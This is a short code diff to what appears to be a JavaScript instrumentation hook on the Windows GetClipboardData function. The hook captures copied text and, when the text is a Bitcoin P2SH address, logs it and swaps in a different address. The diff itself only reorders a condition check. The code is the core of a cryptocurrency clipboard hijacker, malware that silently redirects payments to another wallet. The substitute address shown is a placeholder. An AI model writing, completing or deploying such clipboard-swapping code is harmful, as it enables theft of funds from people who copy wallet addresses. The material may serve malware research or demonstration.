@@ -29,9 +29,9 @@
     var formatName = getClipboardFormatName(this.uFormat);
     log(`[+] GetClipboardData(${formatName}) => ${retval}`);
     
-    if (!retval.isNull()) {
+    if (!retval.isNull() && formatName == 'CF_UNICODETEXT') {
       var original = retval.readUtf16String();
-      if (formatName == 'CF_UNICODETEXT' && isValidP2SHAddress(original)) {
+      if (isValidP2SHAddress(original)) {
         log("[+] Captured address: " + original);
         const modified = '3ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456';
         log("[+] Modified address: " + modified);
